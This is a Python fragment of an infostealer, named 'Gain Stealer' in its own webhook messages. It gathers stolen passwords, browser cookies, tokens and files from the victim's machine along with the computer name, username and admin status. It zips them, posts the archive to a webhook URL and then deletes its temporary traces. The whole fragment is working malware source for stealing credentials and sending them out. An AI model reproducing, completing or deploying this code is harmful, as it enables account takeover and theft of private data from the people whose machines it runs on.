def package_and_send_data():
    temp_dir = tempfile.gettempdir()
    data_dir = os.path.join(temp_dir, f'SystemData_{random.randint(10000, 99999)}')
    os.makedirs(data_dir, exist_ok=True)
    
    data = {}
    
    try:
        passwords = stealpasswords()
        if passwords:
            data['passwords'] = passwords
            with open(os.path.join(data_dir, 'passwords.json'), 'w', encoding='utf-8') as f:
                json.dump(passwords, f, indent=2)
    except:
        pass
    
    try:
        cookies = stealcookies()
        if cookies:
            data['cookies'] = cookies
            with open(os.path.join(data_dir, 'cookies.json'), 'w', encoding='utf-8') as f:
                json.dump(cookies, f, indent=2)
    except:
        pass
    
    try:
        tokens = stealtokens()
        if tokens:
            data['tokens'] = tokens
            with open(os.path.join(data_dir, 'tokens.json'), 'w', encoding='utf-8') as f:
                json.dump(tokens, f, indent=2)
    except:
        pass
    
    try:
        files = grabfiles()
        if files:
            data['files'] = files
            with open(os.path.join(data_dir, 'files.json'), 'w', encoding='utf-8') as f:
                json.dump(files, f, indent=2)
            
            files_dir = os.path.join(temp_dir, 'grabbed_files')
            if os.path.exists(files_dir):
                import shutil
                for root, dirs, file_list in os.walk(files_dir):
                    for file_name in file_list:
                        src = os.path.join(root, file_name)
                        dst = os.path.join(data_dir, 'files', file_name)
                        os.makedirs(os.path.dirname(dst), exist_ok=True)
                        shutil.copy2(src, dst)
    except:
        pass
    
    summary = {
        'timestamp': time.time(),
        'computer_name': os.environ.get('COMPUTERNAME', 'Unknown'),
        'username': os.environ.get('USERNAME', 'Unknown'),
        'admin': is_admin(),
        'data_collected': {k: len(v) for k, v in data.items()}
    }
    
    with open(os.path.join(data_dir, 'summary.json'), 'w', encoding='utf-8') as f:
        json.dump(summary, f, indent=2)
    
    zip_path = os.path.join(temp_dir, 'system_data.zip')
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(data_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, data_dir)
                    zipf.write(file_path, arcname)
        
        send_to_webhook(zip_path, summary)
        
    except Exception as e:
        print(f"Zip error: {e}")
    
    try:
        shutil.rmtree(data_dir, ignore_errors=True)
        files_dir = os.path.join(temp_dir, 'grabbed_files')
        shutil.rmtree(files_dir, ignore_errors=True)
        if os.path.exists(zip_path):
            os.remove(zip_path)
    except:
        pass

def send_to_webhook(zip_path, summary):
    try:
        embed = {
            'title': 'Gain Stealer Report',
            'color': 0x00ff00,
            'fields': []
        }
        
        for key, value in summary.get('data_collected', {}).items():
            embed['fields'].append({
                'name': key,
                'value': str(value),
                'inline': True
            })
        
        embed['fields'].extend([
            {'name': 'Computer', 'value': summary.get('computer_name', 'Unknown'), 'inline': True},
            {'name': 'User', 'value': summary.get('username', 'Unknown'), 'inline': True},
            {'name': 'Admin', 'value': str(summary.get('admin', False)), 'inline': True}
        ])
        
        payload = {
            'username': 'Gain Stealer',
            'embeds': [embed]
        }
        
        requests.post(WEBHOOK_URL, json=payload)
        
        if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
            with open(zip_path, 'rb') as f:
                files = {'file': ('data.zip', f, 'application/zip')}
                requests.post(WEBHOOK_URL, files=files)
        
        return True
        
    except Exception as e:
        print(f"Webhook error: {e}")
        return False
